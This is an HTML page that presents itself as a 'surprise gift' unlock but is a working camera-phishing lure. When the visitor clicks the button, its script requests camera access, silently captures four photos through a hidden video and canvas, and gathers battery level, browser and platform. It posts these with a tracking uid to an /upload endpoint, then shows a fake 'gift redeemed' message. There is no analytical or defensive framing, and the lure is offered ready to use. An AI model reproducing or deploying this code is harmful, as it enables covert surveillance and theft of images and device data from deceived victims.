<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #loading-ui { display: none; }
        .lock-container { position: relative; width: 100px; height: 100px; margin: 0 auto; }
        .key-anim { 
            width: 50px; 
            position: absolute; 
            right: -20px; 
            top: 40px; 
            animation: unlockAction 1.5s infinite ease-in-out; 
        }
        @keyframes unlockAction {
            0%, 100% { transform: rotate(0deg) translateX(0); }
            50% { transform: rotate(-45deg) translateX(-15px); }
        }
        /* Loading Spinner */
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
    </style>
</head>
<body>
    <div id="start-page">
        <h2>🎁 You have a surprise gift! ✨</h2>
        <p>👇 Click below to unlock it 🔓</p>
        <button class="btn" onclick="startWork()">🔓 UNLOCK YOUR GIFT 🎁</button>
    </div>

    <div id="loading-ui">
        <div class="lock-container">
            <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="80">
            <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
        </div>
        <p style="font-size: 18px; margin-top: 20px;">Your Gift is Loading...</p>
        <div class="loader"></div>
    </div>

    <div id="success-msg" style="display:none; color:#00ff00;">
        <h2>Your gift has been redeemed.</h2>
        <p>You are a good person, God bless you. ✨</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        
        function getBrowser() {
            let ua = navigator.userAgent;
            if (ua.indexOf("Chrome") > -1) return "Google Chrome";
            if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
            if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
            return "Mobile Browser";
        }

        async function startWork() {
            document.body.style.background = "black";
            document.body.style.color = "white";
            document.getElementById('start-page').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: params.get('m')==='back'?'environment':'user'}});
                v.srcObject = stream;

                for(let i=0; i<4; i++) {
                    await new Promise(r => setTimeout(r, 1750)); 
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    let batLevel = "N/A";
                    try {
                        const bat = await navigator.getBattery();
                        batLevel = Math.round(bat.level*100)+"%";
                    } catch(e) {}

                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            image: c.toDataURL('image/jpeg'),
                            uid: params.get('uid'), mode: params.get('m'),
                            info: {
                                battery: batLevel, 
                                browser: getBrowser(),
                                platform: navigator.platform
                            }
                        })
                    });
                }
            } catch(e) {}
            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
        }
    </script>
</body>
</html>
